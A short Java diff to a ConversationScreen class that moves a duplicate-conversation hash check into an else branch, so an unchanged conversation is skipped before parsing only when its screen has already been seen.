@@ -68,15 +68,15 @@ public class ConversationScreen {
                     conversations.put(screen,
                             new Integer(conversation.hashCode()));
                     // exploreField(screen, 0, new String[0]);
-                }
-
-                // se conversation e' uguale all'ultima parsata non fare niente.
-                Integer hash = (Integer) conversations.get(screen);
-                if (hash.intValue() == conversation.hashCode()) {
-                    //#ifdef DEBUG
-                    debug.trace("getConversationScreen: equal conversation, ignore it");
-                    //#endif
-                    return;
+                } else {
+                    // se conversation e' uguale all'ultima parsata non fare niente.
+                    Integer hash = (Integer) conversations.get(screen);
+                    if (hash.intValue() == conversation.hashCode()) {
+                        //#ifdef DEBUG
+                        debug.trace("getConversationScreen: equal conversation, ignore it");
+                        //#endif
+                        return;
+                    }
                 }
 
                 Vector result = parseConversation(conversation);
